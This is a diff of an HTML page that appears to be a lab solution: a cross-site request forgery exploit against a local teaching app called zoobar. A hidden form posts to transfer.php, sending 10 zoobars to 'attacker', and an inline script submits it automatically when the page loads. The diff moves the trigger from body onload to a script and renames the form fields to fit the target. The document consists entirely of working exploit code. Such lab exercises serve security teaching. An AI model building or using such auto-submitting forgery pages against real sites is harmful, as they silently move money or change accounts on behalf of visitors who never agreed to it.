@@ -1,10 +1,13 @@
 <!DOCTYPE html>
 <html>
-<body onload="document.getElementById('f').submit()">
+<body>
   <form id="f" method="POST" action="http://localhost:6789/transfer.php">
-    <input type="hidden" name="recipient" value="YOUR_ATTACKER_USERNAME">
-    <input type="hidden" name="amount" value="10">
-    <input type="hidden" name="submit" value="Transfer">
+    <input type="hidden" name="zoobars"    value="10">
+    <input type="hidden" name="recipient"  value="attacker">
+    <input type="hidden" name="submission" value="Send">
   </form>
+  <script>
+    document.getElementById('f').submit();
+  </script>
 </body>
 </html>
